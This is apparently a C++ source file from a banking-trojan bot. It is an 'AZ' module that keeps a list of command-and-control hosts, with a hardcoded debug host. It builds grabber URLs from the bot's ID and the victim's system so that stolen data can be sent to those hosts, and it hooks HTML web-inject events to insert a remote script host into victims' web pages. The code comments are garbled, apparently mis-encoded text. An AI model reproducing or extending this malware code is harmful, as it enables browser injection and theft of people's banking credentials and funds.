//---------------------------------------------------------------------------
#pragma hdrstop


#include "Modules.h"


//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef AzConfigH
	//****************************************
	//   ���� ������� � ������ �������
	//   ���������� ��������� ���������
	//****************************************
	#define USE_AZ_HOSTS
    #define USE_AZ_USER
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if


#include "BotCore.h"
#include "Config.h"
#include "AzConfig.h"
#include "Utils.h"
#include "BotHosts.h"
#include "BotDef.h"
#include "BotConfig.h"
#include "StrConsts.h"
#include "BotHTTP.h"
//-----------------------------------------------------------------------------


// ���������� ������ ������
namespace AZDATA
{
	DWORD PID = 0; 				  // ������������ �������� � ������� �������� ������
	THostChecker *Checker = NULL; // ������� �������� ����������������� ������

    char Variable_ScriptHost[] = {'%','a','z','.','h','o','s','t','%', 0};;
}


//*******************************************************
// ��� ������������ ��� �������� ���� ������
//*******************************************************
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef USE_AZ_USER
	char AZ_USER[AZCONFIG_PARAM_SIZE_AZUSER] = AZCONFIG_PARAM_NAME_AZUSER;
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if


string GetAzUser()
{
	// ������� ���������� ��� ������������ ��� ������ ����������

	string User;

    //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef USE_AZ_USER
		//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifndef DEBUGCONFIG
			User = AZ_USER;
			if (AZCONFIG_PARAM_ENCRYPTED_AZUSER)
				DecryptStr(User.t_str(), User.t_str());
		#else
			User = "test";
		//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if //DEBUGCONFIG
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if //USE_AZ_USER
	return User;
}


//-------------------------------------------------------

//*****************************************************************
//  �����, ������� ����������.
//  ������ ��������������� ������ �������
//*****************************************************************
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef USE_AZ_HOSTS
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifndef DEBUGCONFIG
		char AZ_HOSTS[AZCONFIG_PARAM_SIZE_HOSTS] = AZCONFIG_PARAM_NAME_HOSTS;
	#else
		char AZ_HOSTS[AZCONFIG_PARAM_SIZE_HOSTS] = "az.zika.in\0";
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if


//*****************************************************************
//  �����, ������� ����� ��������� � HTML �������
//*****************************************************************
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef USE_AZ_CONFIG
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifndef DEBUGCONFIG
		// ������� ������
		char AZ_SCRIPTS_HOSTS[AZCONFIG_PARAM_SIZE_SCRIPTHOSTS] = AZCONFIG_PARAM_NAME_SCRIPTHOSTS;
	#else
		// ���������� ������
		char AZ_SCRIPTS_HOSTS[] = "az.zika.in\0";
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if



//----------------------------------------
//  GetAzHostsBuf
//  ������ ���������� �������� �� ����
//  ������ ������� ����������. AZ �������
//----------------------------------------
PCHAR GetAzHostsBuf()
{
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef USE_AZ_HOSTS
		return  AZ_HOSTS;
	#else
		return GetBotHosts();
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
}



//----------------------------------------
//  IsAzHost
//  ������� ���������� ������ ����
//  ��������� ���� ����������� �������
//   ������ ������� AZ
//----------------------------------------
bool IsAzHost(const char* Host)
{
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef USE_AZ_HOSTS
	TStrEnum E(GetAzHostsBuf(), AZCONFIG_PARAM_ENCRYPTED_HOSTS, 0);
		while (E.Next())
			if (E.Line() == Host) return true;
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
	return false;
}


//----------------------------------------------------
// GetAzHost - ������� ���������� ������ ������� ����
// �� ������� ������ ������� AZ
//----------------------------------------------------
string GetAzHost(bool Wait)
{
	string Host;
	do
	{
		Host = GetActiveHostFromBuf2(GetAzHostsBuf(), 0, AZCONFIG_PARAM_ENCRYPTED_HOSTS);
		if (Wait && Host.IsEmpty())
			pSleep(500);
		else
			break;
	}
	while(true);
	return Host;
}
//-----------------------------------------------------------------------------


//----------------------------------------------------
//  GetAzURL
//   ������� ���������� ������ ����� ��
//   ������ ����� ������� � ����������� ����
//----------------------------------------------------
string GetAzURL(const char*  Path)
{
	TURL URL;
	URL.Host = GetAzHost();
	URL.Path = Path;
	return URL.URL();
}
//-----------------------------------------------------------------------------



//------------------------------------------------------
//  GetAzGrabberURLPath
//  ������� ���������� ���� URL ���
//  �������� ���� �������
//------------------------------------------------------
// ������ ���������� � ������ StrConsts.cpp
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef USE_AZ_HOSTS
extern CSSTR EStrAzGrabberPathMask[];

string GetAzGrabberURLPath(const string& SystemName,  const char* Action)
{
	string Mask = GetStr(EStrAzGrabberPathMask);
	if (STRA::IsEmpty(Action)) Action = "save_tf";
	string Path;
	Path.Format(Mask.t_str(), Bot->UID().t_str(), SystemName.t_str(), GetAzUser().t_str(), Action);
	return Path;
}

//------------------------------------------------------
//  GetAzGrabberURL
//  ������� ���������� ����� � �������
//  AZ ��� �������� ���� �������
//------------------------------------------------------
string GetAzGrabberURL(const string& SystemName,  const char* Action)
{
	return GetAzURL(GetAzGrabberURLPath(SystemName, Action).t_str());
}

//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if



//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef USE_AZ_CONFIG

//----------------------------------------------------
//  AzInicializeHostChecker - ������� ��������������
//  ������� �������� ������
//----------------------------------------------------
void AzInicializeHostChecker()
{
	if (IsNewProcess(AZDATA::PID))
	{
		// ������ � ����� ��������
		//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef DEBUGCONFIG
        	bool Encrypted = false;
		#else
        	bool Encrypted = AZCONFIG_PARAM_ENCRYPTED_SCRIPTHOSTS;
		//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
		AZDATA::Checker = new THostChecker(AZ_SCRIPTS_HOSTS, Encrypted);
    }
}
//-----------------------------------------------------------------------------

void AZInjectActivated(LPVOID Sender, int EventId, DWORD WParam, DWORD LParam)
{
	// ������ �������� �������� �����
    AzCheckScriptHosts();
}


void AZInjectExecute(LPVOID Sender, int EventId, DWORD WParam, DWORD LParam)
{
	// ������������� �������� �����
	TBotConfig* Config = Config::GetConfig();
	if (Config && AZDATA::Checker)
	{
		string Host = AZDATA::Checker->GetWorkHost();
		if (Host.IsEmpty())
			Host = AZDATA::Checker->FirstHost;
		Config->HTMLInjects->Variables->SetValue(AZDATA::Variable_ScriptHost, Host);
	}
}

void AZInjectsLoadedEvent(LPVOID Sender, int EventId, DWORD WParam, DWORD LParam)
{
	if (!Sender) return;

	THTMLInjectList* Injects = (THTMLInjectList*)Sender;

	// ���������� ��� ������� � ������� ��������  ������ ����������
	TLock L = Injects->GetLocker();


	int Count = Injects->Count();
	for (int i = 0; i < Count; i++)
	{
		THTMLInject *Inject = Injects->Items(i);
		if (Inject->ContainVariable("%az.host%"))
		{
			// ������������ � ������� � �������� ��� ���������
			Inject->AttachEvent(BOT_EVENT_HTMLINJECT_ACTIVATED, AZInjectActivated);
			Inject->AttachEvent(BOT_EVENT_HTMLINJECT_EXECUTE, AZInjectExecute);
		}

	}
}



//----------------------------------------------------
// AzCheckScriptHosts - ������� ��������� ��������
// ������ ��������� � HTML �������
//----------------------------------------------------
void AzCheckScriptHosts()
{
	// �������������� ��������
	AzInicializeHostChecker();

	AZDATA::Checker->Check();
}
//-----------------------------------------------------------------------------


//----------------------------------------------------
// AzGetScriptHost - ������� ����������  ������� ����
// ��� ������ � HTML �������
//----------------------------------------------------
string AzGetScriptHost()
{
	if (AnsiStr::Hash(AZ_SCRIPTS_HOSTS) == AZ_SCRIPTS_HOSTS_HASH)
		return NULLSTR;

	// �������������� ����� ������
	AzInicializeHostChecker();

	// ����������� ������� ����
	return AZDATA::Checker->GetWorkHost();
}



//-----------------------------------------------------------------------------
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if


//----------------------------------------------------
//  AzInizializeHTMLInjects  - ������� ��������������
//  ������� ������� ������ � HTML ��������
//----------------------------------------------------
void AzInizializeHTMLInjects()
{
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef USE_AZ_CONFIG
	// ���������� ������� � ���� � ��� ��������� ���������
	TBotConfig* Config = Config::GetConfig();
	if (Config)
	{
		// ������������ � ������� �������� HTML ��������
		Config->HTMLInjects->AttachEvent(BOT_EVENT_HTMLINJECTS_LOADED, AZInjectsLoadedEvent);
		AZInjectsLoadedEvent(Config->HTMLInjects, 0, 0, 0);
	}
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
}
//-----------------------------------------------------------------------------




